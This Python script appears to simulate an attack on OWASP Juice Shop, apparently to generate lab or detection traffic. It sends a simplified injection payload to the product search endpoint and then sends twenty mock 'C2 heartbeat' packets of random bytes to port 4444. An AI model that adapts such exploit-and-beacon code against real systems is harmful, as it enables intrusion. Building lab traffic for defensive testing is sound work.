import os
import requests
import time
import socket
import random

TARGET_URL = os.getenv("TARGET_URL", "http://juice-shop:3000/rest/products/search")
VICTIM_IP = os.getenv("VICTIM_IP", "juice-shop")
C2_PORT = int(os.getenv("C2_PORT", "4444"))

# Wait for Juice Shop to be ready
print("[*] Waiting for juice-shop:3000 to be ready...")
while True:
    try:
        with socket.create_connection((VICTIM_IP, 3000), timeout=2):
            print("[+] juice-shop is up!")
            break
    except (socket.timeout, ConnectionRefusedError):
        time.sleep(2)

# 1. Exploitation Phase (RCE-style payload)
print("[*] Stage 1: Sending RCE Exploit payload...")
rce_payload = "'; process.exit(); //" # Simplified RCE-style injection
try:
    r = requests.get(TARGET_URL, params={"q": rce_payload})
    print(f"[+] Exploit sent to {TARGET_URL}, Status: {r.status_code}")
except Exception as e:
    print(f"[-] Exploit failed: {e}")

time.sleep(2)

# 2. Infiltration / C2 Phase
print(f"[*] Stage 2: Starting C2 communication (Infiltration) on port {C2_PORT}...")
for i in range(20): # Increased iterations
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            print(f"[*] Attempting C2 heartbeat {i} to {VICTIM_IP}:{C2_PORT}...")
            s.connect((VICTIM_IP, C2_PORT))
            msg = f"heartbeat_{i}_data_{random.getrandbits(32)}".encode()
            s.sendall(msg)
            print(f"[+] C2 heartbeat {i} sent successfully ({len(msg)} bytes)")
    except Exception as e:
        # Expected if Juice Shop isn't listening, but packet is still sent
        print(f"[!] C2 heartbeat {i} packet sent (Connection error expected: {e})")
    
    time.sleep(random.uniform(0.5, 1.5)) # Slightly faster for more concentration

print("[*] Infiltration simulation completed.")
